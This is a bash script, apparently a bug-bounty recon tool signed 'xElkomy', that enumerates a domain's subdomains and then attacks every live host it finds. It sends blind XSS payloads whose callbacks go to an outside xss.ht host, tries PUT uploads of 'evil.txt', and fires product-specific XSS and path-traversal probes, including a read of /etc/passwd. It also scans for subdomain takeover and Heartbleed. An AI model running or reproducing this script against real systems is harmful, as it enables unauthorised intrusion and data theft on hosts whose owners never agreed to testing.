#!/bin/bash

#COLORS
BOLD="\e[1m"
NORMAL="\e[0m"
GREEN="\e[92m"

echo -e "${GREEN}[+]Start Subdomain Enumeretion"

#Assetfinder
echo -e "${GREEN}[+] Starting Assetfinder"
assetfinder --subs-only $1 |sort -u |tee assetfinder.txt

#Sublist3r
echo -e "${GREEN}[+] Starting Sublist3r"
python ~/tools/Sublist3r/sublist3r.py -d $1 -o sublist3r.txt

#Amass
echo -e "${GREEN}[+] Starting Amass"
amass enum -d $1 --passive -o amass.txt

#Filtering
echo -e "${GREEN}[+] Starting Filtering"
cat sublist3r.txt assetfinder.txt amass.txt| sort -u |uniq -u| grep -v "*" |sort -u|tee Final-Subs.txt

#Httprobe
echo -e "${GREEN}[+] Starting Httprobe"
cat Final-Subs.txt |sort -u |uniq -u|httprobe|tee $1-alive.txt

#Get-Tilie
echo -e "${GREEN}[+]Start Get-titles"
for i in $(cat $1-alive.txt ); do echo "$i | $(curl --connect-timeout 0.5 $i -so - | grep -iPo '(?<=<title>)(.*)(?=</title>)')"; done | tee -a $1-titles.txt

echo -e "${GREEN}[+]Start Subdomain Takeover Scan"
subzy -targets Final-Subs.txt -hide_fails --verify_ssl -concurrency 20 |sort -u|tee "subzy.txt"

echo -e "${GREEN}[+] DNSPROBE Start"
cat $1-alive.txt|dnsprobe -o $1-dnsprobe.txt

echo -e "${GREEN}[+]Finishing The Enumeration OR The Reconnaisses"

rm sublist3r.txt assetfinder.txt amass.txt

echo -e "${GREEN}[+]Start Discover Some Vulnerabilities"
echo -e "${GREEN}[+]Start Nuclei Templets"

cat $1-alive.txt |nuclei -t "/root/tools/nuclei-templates/*/*.yaml" -o $1-nuclei.txt

echo -e "${GREEN}[+]Start Wayback Blind XSS"
cat $1-alive.txt| waybackurls | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace | qsreplace -a | dalfox pipe --multicast --blind "https://xelkomy.xss.ht"

echo -e "${GREEN}[+]End Wayback Blind XSS"

echo -e "${GREEN}[+]Start Scan Cookieless"
assetfinder --subs-only $1|httprobe|cookieless |sort -u |tee cookieless.txt

echo -e "${GREEN}[+]End Scan Cookieless"

echo -e "${GREEN}[+]Start PUT Method Enable"
for domain in $(cat $1-alive.txt)
do
 curl -s -o /dev/null -w "URL: %{url_effective} - Response: %{response_code} " -X PUT -d "hello world"  "${domain}/evil.txt"
done

echo -e "${GREEN}[+]End PUT Method Enable"

echo -e "${GREEN}[+]Start Fuzz-xElkomy.py"

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/help/index.jsp?view=<script>alert("xss")</script>' 'onloadHandler' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/global-protect/login.esp?user=%22%3balert(%27xElkomy%27)%2f%2f407' 'GlobalProtect Portal' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/wp-json/wp/v2/users' '[{"id"' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/webmail/?language=pl&interface=pro&username=&color=%27"><svg/onload=prompt(%27xElkomy%27)//' 'Powered by IceWarp Server ©' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/libs/dam/merge/metadata.html?path=%3Csvg/onload=prompt(%27xElkomy%27)%3E&.ico' '{"assetPaths":' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/crx/de/setPreferences.jsp;%0ATia.html?keymap=<svg/onload=alert(document.domain)>&language=0' 'A JSONObject ' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/REPORTSERVER/Pages/ReportViewer.aspx' 'ReportViewerControl' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/modcp/index.php?loginerror_arr[0]=badlogin_strikes_logintypeusername&loginerror_arr[1]=javascript:alert("xElkomy")&loginerror_arr[2]=1&vb_login_username=xElkomy' 'Version 5.5.4' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/Trace.axd' 'Application Trace' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/examples/servlets/servlet/CookieExample' 'Cookies Example' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/tmui/login.jsp/../tmui/locallb/workspace/fileRead.jspfileName=/etc/passwd' 'root:x' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/evil.txt' 'hello world' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../' 'dofile'

echo -e "${GREEN}[+]End Fuzz-xElkomy.py"

echo -e "[*]Start Wayback and Sort"
cat $1-alive.txt| waybackurls | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace | qsreplace -a > $1-wayback.txt

echo -e "${GREEN}[+]Start Heartbleed Scan"
cat Final-Subs.txt| while read line ; do echo "QUIT"|openssl s_client -connect $line:443 2>&1|grep 'server extension "heartbeat" (id=15)' || echo $line: safe;done > $1-heartbleed.txt

#Good for here :)
echo -e "${GREEN}[+]Bye Bye -Regards,xElkomy - 0xElkomy"

